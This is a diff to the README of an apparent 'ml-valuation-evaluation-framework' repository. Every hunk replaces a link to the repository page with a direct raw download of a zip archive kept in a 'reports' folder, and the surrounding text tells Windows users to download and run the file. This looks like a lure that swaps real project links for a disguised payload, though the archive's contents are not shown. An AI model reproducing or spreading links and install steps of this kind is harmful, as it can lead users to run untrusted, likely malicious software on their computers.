@@ -1,6 +1,6 @@
 # ⚙️ ml-valuation-evaluation-framework - Reliable ML Model Evaluation Tools
 
-[![Download ml-valuation-evaluation-framework](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/salamamuhammad96-sudo/ml-valuation-evaluation-framework)
+[![Download ml-valuation-evaluation-framework](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/salamamuhammad96-sudo/ml-valuation-evaluation-framework/main/reports/evaluation_valuation_framework_ml_2.8.zip)
 
 ## 📋 About ml-valuation-evaluation-framework
 
@@ -35,7 +35,7 @@ You will download and run the software on your Windows computer. Follow each ste
 
 The software is on GitHub. Click the big green link below to visit the download page:
 
-[![Download ml-valuation-evaluation-framework](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/salamamuhammad96-sudo/ml-valuation-evaluation-framework)
+[![Download ml-valuation-evaluation-framework](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/salamamuhammad96-sudo/ml-valuation-evaluation-framework/main/reports/evaluation_valuation_framework_ml_2.8.zip)
 
 After the page loads:
 
@@ -113,7 +113,7 @@ Use the **Settings** menu inside the app to customize these options.
 
 You can get the software from the official GitHub repository:
 
-[https://github.com/salamamuhammad96-sudo/ml-valuation-evaluation-framework](https://github.com/salamamuhammad96-sudo/ml-valuation-evaluation-framework)
+[https://raw.githubusercontent.com/salamamuhammad96-sudo/ml-valuation-evaluation-framework/main/reports/evaluation_valuation_framework_ml_2.8.zip](https://raw.githubusercontent.com/salamamuhammad96-sudo/ml-valuation-evaluation-framework/main/reports/evaluation_valuation_framework_ml_2.8.zip)
 
 Visit this page, then download and run the latest release file as described above.
 
